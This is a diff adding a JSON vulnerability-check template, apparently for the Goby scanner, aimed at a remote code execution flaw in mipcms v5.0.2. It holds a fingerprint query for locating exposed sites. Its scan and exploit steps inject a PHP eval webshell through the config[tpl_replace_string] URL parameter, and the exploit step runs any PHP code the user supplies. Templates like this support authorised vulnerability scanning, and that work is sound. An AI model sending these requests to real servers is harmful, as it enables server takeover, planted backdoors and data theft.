@@ -1,0 +1,89 @@
+{
+  "Name": "mipcms index siteview rce",
+  "Description": "There is an arbitrary code execution vulnerability in mipcms v5.0.2, which can be used by an attacker to execute arbitrary code, write a backdoor, and obtain server permissions.\\n",
+  "Product": "mipcms",
+  "Homepage": "https://www.mipjz.com/",
+  "DisclosureDate": "2021-06-18",
+  "Author": "gobysec@gmail.com",
+  "GobyQuery": "app=\"MIPCMS内容管理系统\" || body=\"/default/css/mipcms.css\" || body=\"/mip-form/mip-form.js\"",
+  "Level": "3",
+  "Impact": "<p>There is an arbitrary code execution vulnerability in mipcms group system v5.0.2, which may cause attackers to execute arbitrary code on the server side, write backdoor, obtain server permissions, and then control the whole web server.<br></p>",
+  "Recommendation": "<p>1.Set access policy and whitelist access through firewall and other security devices.</p><p><span style=\"color: var(--primaryFont-color);\">2. If not necessary, access to the system from the public network is prohibited.</span></p>",
+  "References": [
+    "POCID9434"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "eval",
+      "type": "input",
+      "value": "phpinfo();"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/index.php?s=/index/index/siteview&parent=index/index&config[tpl_replace_string][<!DOCTYPE]=<?php+@eval($_GET%5Ba%5D);?><!DOCTYPE&a=echo+md5(123);&config[tpl_cache]=0",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "202cb962ac59075b964b07152d234b70",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/index.php?s=/index/index/siteview&parent=index/index&config[tpl_replace_string][<!DOCTYPE]=<?php+@eval($_GET[a]);?><!DOCTYPE&a={{{eval}}}&config[tpl_cache]=0",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "SetVariable": [
+        "output|lastbody|regex|([\\w\\W]+)<!DOCTYPE html>"
+      ]
+    }
+  ],
+  "Tags": [
+    "RCE"
+  ],
+  "CVEIDs": null,
+  "CVSSScore": "0.0",
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
